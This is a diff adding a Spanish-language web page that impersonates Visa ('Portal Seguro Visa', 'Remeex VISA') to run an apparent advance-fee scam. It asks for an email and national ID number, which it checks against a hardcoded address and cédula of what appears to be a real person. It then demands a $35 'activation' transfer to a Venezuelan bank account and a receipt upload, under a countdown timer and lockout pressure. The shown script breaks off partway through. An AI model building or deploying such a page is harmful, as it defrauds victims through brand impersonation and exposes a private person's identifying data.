@@ -1,0 +1,1409 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Activación de Cuenta - Portal Seguro Visa</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <link rel="apple-touch-icon" href="visabluapple.png">
+  <meta name="description" content="Remeex VISA: transferencias globales sin comisiones, rapidas y seguras."/>
+  <meta name="keywords" content="remesas, transferencias internacionales, enviar dinero, VISA"/>
+  <meta name="author" content="Remeex VISA"/>
+  <meta name="robots" content="index, follow"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Variables de color Visa corporativo */
+        :root {
+            --primary-color: #1a1f71;
+            --primary-color-light: #2a3183;
+            --primary-color-dark: #141965;
+            --secondary-color: #f7b600;
+            --secondary-color-light: #ffc626;
+            --secondary-color-dark: #e0a500;
+            --accent-color: #0055c8;
+            --accent-color-light: #1e6bd8;
+            --text-color: #2a2a2a;
+            --text-secondary: #666;
+            --background-color: #f9faff;
+            --card-color: #fff;
+            --error-color: #d14124;
+            --success-color: #17a84b;
+            --success-color-light: #1cc058;
+            --light-color: #f2f4f8;
+            --border-color: #e0e4e8;
+            --visa-gradient: linear-gradient(135deg, #1a1f71 0%, #142787 100%);
+            --visa-gradient-hover: linear-gradient(135deg, #2a3183 0%, #1e32a2 100%);
+            --visa-accent-gradient: linear-gradient(135deg, #f7b600 0%, #f5a700 100%);
+            --box-shadow: 0 10px 25px rgba(26, 31, 113, 0.08);
+            --box-shadow-hover: 0 15px 30px rgba(26, 31, 113, 0.15);
+            --transition-fast: all 0.2s ease;
+            --transition-medium: all 0.3s ease-in-out;
+            --transition-slow: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            --warning-color: #ff9800;
+            --warning-color-light: #ffb74d;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            position: relative;
+            letter-spacing: -0.01em;
+            font-weight: 400;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(26, 31, 113, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 90% 90%, rgba(247, 182, 0, 0.03) 0%, transparent 50%);
+            padding: 20px 0;
+            overflow-y: auto;
+            overscroll-behavior-y: contain;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 15px;
+            position: relative;
+            z-index: 1;
+            width: 100%;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            animation: fadeInDown 1s ease-out;
+        }
+        
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        .logo {
+            max-width: 100px;
+            height: auto;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+            transition: all 0.5s ease;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 12px;
+            font-weight: 700;
+            background: var(--visa-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            display: inline-block;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: var(--visa-accent-gradient);
+            border-radius: 3px;
+        }
+        
+        h2 {
+            font-size: 22px;
+            margin-bottom: 18px;
+            font-weight: 600;
+            color: var(--primary-color);
+            position: relative;
+            display: inline-block;
+        }
+        
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 50px;
+            height: 2px;
+            background: var(--secondary-color);
+            border-radius: 2px;
+        }
+        
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        
+        .card {
+            background-color: var(--card-color);
+            border-radius: 20px;
+            box-shadow: var(--box-shadow);
+            padding: 30px 25px;
+            margin-bottom: 30px;
+            transition: var(--transition-medium);
+            display: none;
+            border: 1px solid rgba(224, 228, 232, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card.active {
+            display: block;
+            animation: cardEntrance 0.7s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+        
+        .card:hover {
+            box-shadow: var(--box-shadow-hover);
+            transform: translateY(-5px) translateZ(0);
+        }
+        
+        @keyframes cardEntrance {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px) rotateX(5deg);
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0) rotateX(0);
+            }
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: var(--text-color);
+            font-size: 15px;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 15px;
+            transition: var(--transition-fast);
+            background-color: var(--light-color);
+            color: var(--text-color);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02) inset;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.1), 0 2px 5px rgba(0, 0, 0, 0.02) inset;
+            background-color: white;
+            transform: translateY(-2px);
+        }
+        
+        input:disabled {
+            background-color: #f8f8f8;
+            color: #555;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+        
+        .btn {
+            background: var(--visa-gradient);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            letter-spacing: 0.5px;
+            box-shadow: 0 5px 15px rgba(26, 31, 113, 0.15);
+        }
+        
+        .btn:hover:not(:disabled) {
+            box-shadow: 0 8px 20px rgba(26, 31, 113, 0.25);
+            transform: translateY(-3px);
+        }
+        
+        .btn:disabled {
+            background: linear-gradient(135deg, #8a8da6 0%, #6d7090 100%);
+            cursor: not-allowed;
+            opacity: 0.7;
+            box-shadow: none;
+        }
+        
+        .btn:disabled:hover {
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: var(--primary-color);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .btn-secondary:hover {
+            background: var(--light-color);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            color: var(--primary-color-dark);
+            border-color: var(--primary-color-light);
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 8px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transform: translateY(0);
+            opacity: 0;
+            height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .error-message:not(:empty) {
+            opacity: 1;
+            height: auto;
+            padding: 5px 0;
+            animation: shake 0.5s ease;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .timer-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 15px;
+            font-weight: 600;
+            font-size: 16px;
+            z-index: 1000;
+            box-shadow: 0 8px 25px rgba(26, 31, 113, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideInTop 0.5s ease;
+        }
+        
+        @keyframes slideInTop {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .timer-container.warning {
+            background-color: var(--warning-color);
+            animation: pulse 1s infinite;
+        }
+        
+        .timer-container.danger {
+            background-color: var(--error-color);
+            animation: pulse-fast 0.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        @keyframes pulse-fast {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .data-card {
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .data-card h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 15px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+        
+        .data-label {
+            font-weight: 600;
+            color: var(--primary-color);
+            font-size: 15px;
+        }
+        
+        .data-value {
+            font-weight: 500;
+            color: var(--text-color);
+            font-size: 15px;
+        }
+        
+        .btn-copy {
+            background: transparent;
+            color: var(--primary-color);
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            font-size: 16px;
+            transition: var(--transition-fast);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            position: relative;
+        }
+        
+        .btn-copy:hover {
+            background-color: rgba(26, 31, 113, 0.05);
+            transform: scale(1.1);
+            color: var(--accent-color);
+        }
+        
+        .tooltip {
+            position: absolute;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            top: -40px;
+            right: 0;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+            transform: translateY(5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            z-index: 10;
+        }
+        
+        .tooltip.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .spinner-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s ease;
+        }
+        
+        .spinner-container.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(26, 31, 113, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            border-left-color: var(--primary-color);
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .processing-text {
+            font-size: 20px;
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        
+        .checkmark-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            animation: appear 0.5s ease;
+        }
+        
+        .checkmark-container.active {
+            display: flex;
+        }
+        
+        @keyframes appear {
+            from {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        .checkmark-circle {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            background: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+            animation: scaleIn 0.6s ease;
+            box-shadow: 0 10px 25px rgba(23, 168, 75, 0.3);
+        }
+        
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+        
+        .checkmark {
+            color: white;
+            font-size: 36px;
+            animation: checkmark 0.5s ease;
+        }
+        
+        @keyframes checkmark {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.3); }
+            100% { transform: scale(1); }
+        }
+        
+        .success-text {
+            font-size: 24px;
+            color: var(--success-color);
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .success-note {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            text-align: center;
+            max-width: 400px;
+            line-height: 1.6;
+        }
+        
+        .visa-security {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 30px;
+            gap: 12px;
+            padding: 16px;
+            border-radius: 16px;
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+            transition: var(--transition-medium);
+        }
+        
+        .visa-security:hover {
+            background-color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transform: translateY(-3px);
+        }
+        
+        .visa-security img {
+            height: 25px;
+        }
+        
+        .security-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            text-align: center;
+        }
+        
+        .visa-security:hover .security-text {
+            color: var(--primary-color);
+        }
+        
+        .alert-box {
+            background-color: rgba(255, 152, 0, 0.1);
+            border: 1px solid var(--warning-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .alert-icon {
+            color: var(--warning-color);
+            font-size: 24px;
+            margin-top: 2px;
+        }
+        
+        .alert-content {
+            flex: 1;
+        }
+        
+        .alert-title {
+            font-weight: 600;
+            color: var(--warning-color);
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+        
+        .alert-text {
+            color: var(--text-color);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .upload-area {
+            border: 2px dashed var(--border-color);
+            border-radius: 15px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            background-color: var(--light-color);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .upload-area:hover {
+            border-color: var(--primary-color);
+            background-color: rgba(26, 31, 113, 0.05);
+        }
+        
+        .upload-area.dragover {
+            border-color: var(--accent-color);
+            background-color: rgba(0, 85, 200, 0.1);
+        }
+        
+        .upload-icon {
+            font-size: 48px;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+        
+        .upload-text {
+            color: var(--text-color);
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        
+        .upload-hint {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .file-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        
+        .file-preview {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid var(--border-color);
+        }
+        
+        .file-preview.active {
+            display: block;
+        }
+        
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .file-icon {
+            font-size: 32px;
+            color: var(--success-color);
+        }
+        
+        .file-details {
+            flex: 1;
+        }
+        
+        .file-name {
+            font-weight: 500;
+            color: var(--text-color);
+            margin-bottom: 5px;
+        }
+        
+        .file-size {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .file-remove {
+            color: var(--error-color);
+            cursor: pointer;
+            font-size: 20px;
+            transition: var(--transition-fast);
+        }
+        
+        .file-remove:hover {
+            transform: scale(1.2);
+        }
+        
+        .blocked-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .blocked-icon {
+            font-size: 80px;
+            color: var(--error-color);
+            margin-bottom: 30px;
+        }
+        
+        .blocked-title {
+            font-size: 32px;
+            color: white;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        
+        .blocked-text {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 600px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .blocked-redirect {
+            color: var(--secondary-color);
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+                margin: 10px auto;
+            }
+            
+            .card {
+                padding: 20px 15px;
+                margin-bottom: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            h2 {
+                font-size: 20px;
+            }
+            
+            .timer-container {
+                top: 10px;
+                right: 10px;
+                padding: 10px 15px;
+                font-size: 14px;
+            }
+            
+            .data-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            
+            .upload-area {
+                padding: 30px 15px;
+            }
+            
+            .upload-icon {
+                font-size: 36px;
+            }
+            
+            .blocked-icon {
+                font-size: 60px;
+            }
+            
+            .blocked-title {
+                font-size: 24px;
+            }
+            
+            .blocked-text {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="blocked-overlay" class="blocked-overlay" style="display: none;">
+        <div class="blocked-icon">
+            <i class="fas fa-lock"></i>
+        </div>
+        <div class="blocked-title">Acceso Denegado</div>
+        <div class="blocked-text">
+            Esta sesión de activación ya ha sido utilizada. Por motivos de seguridad, cada enlace de activación solo puede ser usado una vez.
+        </div>
+        <div class="blocked-redirect">
+            Redirigiendo en <span id="redirect-timer">5</span> segundos...
+        </div>
+    </div>
+
+    <div class="timer-container" id="timer">
+        <i class="fas fa-hourglass-half"></i>
+        <span id="timer-display">25:00</span>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo" class="logo">
+            </div>
+            <h1>Activación de Cuenta</h1>
+            <p>Complete el proceso de activación de su cuenta Visa en el tiempo establecido</p>
+        </div>
+
+        <!-- Formulario de Login -->
+        <div class="card active" id="login-card">
+            <h2>Verificación de Identidad</h2>
+            <p>Ingrese sus credenciales para continuar con la activación de su cuenta</p>
+            
+            <div class="form-group">
+                <label for="email">Correo Electrónico:</label>
+                <input type="email" id="email" placeholder="Ingrese su correo electrónico" autocomplete="email">
+                <div class="error-message" id="email-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="cedula">Cédula de Identidad:</label>
+                <input type="text" id="cedula" placeholder="Ingrese su número de cédula" inputmode="numeric" autocomplete="off">
+                <div class="error-message" id="cedula-error"></div>
+            </div>
+            
+            <button class="btn" onclick="validateLogin()">
+                Iniciar Sesión
+                <i class="fas fa-arrow-right"></i>
+            </button>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura • Verificación SSL • Proceso Único</span>
+            </div>
+        </div>
+
+        <!-- Información de Transferencia -->
+        <div class="card" id="transfer-card">
+            <h2>Datos para Activación</h2>
+            <p>Complete la transferencia con los siguientes datos para activar su cuenta:</p>
+            
+            <div class="alert-box">
+                <div class="alert-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="alert-content">
+                    <div class="alert-title">Importante</div>
+                    <div class="alert-text">
+                        Debe realizar la transferencia exactamente por <strong>$35.00 USD</strong> para completar la activación. Este es un pago único de activación.
+                    </div>
+                </div>
+            </div>
+            
+            <div class="data-card">
+                <h3>Información de Transferencia</h3>
+                
+                <div class="data-item">
+                    <div class="data-label">Banco:</div>
+                    <div class="data-value">Banco Venezolano de Crédito</div>
+                    <button class="btn-copy" onclick="copyToClipboard('Banco Venezolano de Crédito', this)">
+                        <i class="fas fa-copy"></i>
+                        <span class="tooltip">¡Copiado!</span>
+                    </button>
+                </div>
+                
+                <div class="data-item">
+                    <div class="data-label">RIF:</div>
+                    <div class="data-value">J-404757732</div>
+                    <button class="btn-copy" onclick="copyToClipboard('J404757732', this)">
+                        <i class="fas fa-copy"></i>
+                        <span class="tooltip">¡Copiado!</span>
+                    </button>
+                </div>
+                
+                <div class="data-item">
+                    <div class="data-label">Teléfono:</div>
+                    <div class="data-value">0412-200-00-00</div>
+                    <button class="btn-copy" onclick="copyToClipboard('04122000000', this)">
+                        <i class="fas fa-copy"></i>
+                        <span class="tooltip">¡Copiado!</span>
+                    </button>
+                </div>
+                
+                <div class="data-item">
+                    <div class="data-label">Monto:</div>
+                    <div class="data-value">4.970,00 Bs</div>
+                    <button class="btn-copy" onclick="copyToClipboard('4970,00', this)">
+                        <i class="fas fa-copy"></i>
+                        <span class="tooltip">¡Copiado!</span>
+                    </button>
+                </div>
+                
+                <div class="data-item">
+                    <div class="data-label">Concepto:</div>
+                    <div class="data-value">ACTIVACION</div>
+                    <button class="btn-copy" onclick="copyToClipboard('ACTIVACION', this)">
+                        <i class="fas fa-copy"></i>
+                        <span class="tooltip">¡Copiado!</span>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="alert-box">
+                <div class="alert-icon">
+                    <i class="fas fa-info-circle"></i>
+                </div>
+                <div class="alert-content">
+                    <div class="alert-title">Instrucciones</div>
+                    <div class="alert-text">
+                        Una vez realizada la transferencia, debe adjuntar el comprobante en el siguiente paso. Su cuenta será activada después de la verificación.
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn" onclick="showUploadForm()">
+                Continuar con Comprobante
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+
+        <!-- Formulario de Comprobante -->
+        <div class="card" id="upload-card">
+            <h2>Adjuntar Comprobante</h2>
+            <p>Suba el comprobante de su transferencia para completar la activación</p>
+            
+            <div class="form-group">
+                <label for="upload-area">Comprobante de Transferencia:</label>
+                <div class="upload-area" id="upload-area">
+                    <input type="file" class="file-input" id="file-input" accept="image/*,.pdf" onchange="handleFileSelect(this)">
+                    <div class="upload-icon">
+                        <i class="fas fa-cloud-upload-alt"></i>
+                    </div>
+                    <div class="upload-text">Haga clic para seleccionar o arrastre el archivo aquí</div>
+                    <div class="upload-hint">Formatos aceptados: JPG, PNG, PDF (Máximo 10MB)</div>
+                </div>
+                <div class="file-preview" id="file-preview">
+                    <div class="file-info">
+                        <div class="file-icon">
+                            <i class="fas fa-file-alt"></i>
+                        </div>
+                        <div class="file-details">
+                            <div class="file-name" id="file-name"></div>
+                            <div class="file-size" id="file-size"></div>
+                        </div>
+                        <div class="file-remove" onclick="removeFile()">
+                            <i class="fas fa-times"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn" id="submit-btn" onclick="submitApplication()" disabled>
+                Enviar Comprobante
+                <i class="fas fa-check"></i>
+            </button>
+        </div>
+    </div>
+
+    <div class="spinner-container" id="spinner-container">
+        <div class="spinner"></div>
+        <div class="processing-text">Procesando comprobante...</div>
+        
+        <div class="checkmark-container" id="checkmark-container">
+            <div class="checkmark-circle">
+                <i class="fas fa-check checkmark"></i>
+            </div>
+            <div class="success-text">¡Comprobante Recibido!</div>
+            <div class="success-note">
+                Su comprobante ha sido enviado correctamente. Nuestro equipo lo revisará y activará su cuenta en las próximas horas.
+            </div>
+            <button class="btn" onclick="completeActivation()">
+                Finalizar Proceso
+                <i class="fas fa-home"></i>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Configuración
+        const VALID_EMAIL = 'ronaldcaro876@gmail.com';
+        const VALID_CEDULA = '29672592';
+        const ACTIVATION_TIME = 25; // minutos
+        const DOLLAR_RATE = 151.10; // Tasa de cambio
+        const ACTIVATION_AMOUNT = 35; // USD
+        
+        // Variables de estado
+        let timeLeft = ACTIVATION_TIME * 60; // en segundos
+        let timerInterval;
+        let selectedFile = null;
+        let isBlocked = false;
+        
+        // Inicialización
+        document.addEventListener('DOMContentLoaded', function() {
+            checkActivationStatus();
+            if (!isBlocked) {
+                startTimer();
+                initializeUploadArea();
+            }
+        });
+        
+        // Verificar si la activación ya fue usada
+        function checkActivationStatus() {
+            const activationUsed = localStorage.getItem('visa_activation_used');
+            const activationTime = localStorage.getItem('visa_activation_time');
+            
+            if (activationUsed === 'true') {
+                showBlockedOverlay();
+                return;
+            }
+            
+            // Verificar si han pasado más de 25 minutos desde la primera visita
+            if (activationTime) {
+                const elapsed = Date.now() - parseInt(activationTime);
+                const maxTime = ACTIVATION_TIME * 60 * 1000; // 25 minutos en ms
+                
+                if (elapsed > maxTime) {
+                    localStorage.setItem('visa_activation_used', 'true');
+                    showBlockedOverlay();
+                    return;
+                }
+                
+                // Ajustar tiempo restante
+                const elapsedSeconds = Math.floor(elapsed / 1000);
+                timeLeft = Math.max(0, (ACTIVATION_TIME * 60) - elapsedSeconds);
+            } else {
+                // Primera visita
+                localStorage.setItem('visa_activation_time', Date.now().toString());
+            }
+        }
+        
+        // Mostrar overlay de bloqueo
+        function showBlockedOverlay() {
+            isBlocked = true;
+            document.getElementById('blocked-overlay').style.display = 'flex';
+            
+            let redirectCounter = 5;
+            const redirectTimer = setInterval(() => {
+                redirectCounter--;
+                document.getElementById('redirect-timer').textContent = redirectCounter;
+                
+                if (redirectCounter <= 0) {
+                    clearInterval(redirectTimer);
+                    window.location.href = 'about:blank';
+                }
+            }, 1000);
+        }
+        
+        // Iniciar temporizador
+        function startTimer() {
+            const timerDisplay = document.getElementById('timer-display');
+            const timerContainer = document.getElementById('timer');
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Cambiar color según el tiempo restante
+                if (timeLeft <= 300) { // 5 minutos
+                    timerContainer.className = 'timer-container danger';
+                } else if (timeLeft <= 600) { // 10 minutos
+                    timerContainer.className = 'timer-container warning';
+                }
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    localStorage.setItem('visa_activation_used', 'true');
+                    showBlockedOverlay();
+                }
+            }, 1000);
+        }
+        
+        // Validar login
+        function validateLogin() {
+            const email = document.getElementById('email').value.trim();
+            const cedula = document.getElementById('cedula').value.trim();
+            let isValid = true;
+            
+            // Validar email
+            if (!email) {
+                showError('email-error', 'Por favor ingrese su correo electrónico');
+                isValid = false;
+            } else if (email.toLowerCase() !== VALID_EMAIL.toLowerCase()) {
+                showError('email-error', 'Correo electrónico incorrecto');
+                isValid = false;
+            } else {
+                clearError('email-error');
+            }
+            
+            // Validar cédula
+            if (!cedula) {
+                showError('cedula-error', 'Por favor ingrese su número de cédula');
+                isValid = false;
+            } else if (cedula !== VALID_CEDULA) {
+                showError('cedula-error', 'Número de cédula incorrecto');
+                isValid = false;
+            } else {
+                clearError('cedula-error');
+            }
+            
+            if (isValid) {
+                showCard('transfer-card');
+                updateTransferAmount();
+            }
+        }
+        
+        // Mostrar error
+        function showError(elementId, message) {
+            const errorElement = document.getElementById(elementId);
+            errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+        }
+        
+        // Limpiar error
+        function clearError(elementId) {
+            document.getElementById(elementId).textContent = '';
+        }
+        
+        // Mostrar tarjeta
+        function showCard(cardId) {
+            document.querySelectorAll('.card').forEach(card => {
+                card.classList.remove('active');
+            });
+            document.getElementById(cardId).classList.add('active');
+        }
+        
+        // Actualizar monto de transferencia
+        function updateTransferAmount() {
+            const bsAmount = (ACTIVATION_AMOUNT * DOLLAR_RATE).toFixed(2);
+            const formattedAmount = formatNumberWithCommas(bsAmount);
+            
+            document.querySelector('.data-value').textContent = formattedAmount + ' Bs';
+        }
+        
+        // Formatear número con separadores de miles
+        function formatNumberWithCommas(number) {
+            return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+        }
+        
+        // Copiar al portapapeles
+        function copyToClipboard(text, button) {
+            navigator.clipboard.writeText(text).then(() => {
+                const tooltip = button.querySelector('.tooltip');
+                tooltip.classList.add('active');
+                
+                setTimeout(() => {
+                    tooltip.classList.remove('active');
+                }, 2000);
+            }).catch(err => {
+                console.error('Error al copiar:', err);
+                alert('No se pudo copiar el texto');
+            });
+        }
+        
+        // Mostrar formulario de carga
+        function showUploadForm() {
+            showCard('upload-card');
+        }
+        
+        // Inicializar área de carga
+        function initializeUploadArea() {
+            const uploadArea = document.getElementById('upload-area');
+            const fileInput = document.getElementById('file-input');
+            
+            // Eventos de drag and drop
+            uploadArea.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                uploadArea.classList.add('dragover');
+            });
+            
+            uploadArea.addEventListener('dragleave', (e) => {
+                e.preventDefault();
+                uploadArea.classList.remove('dragover');
+            });
+            
+            uploadArea.addEventListener('drop', (e) => {
+                e.preventDefault();
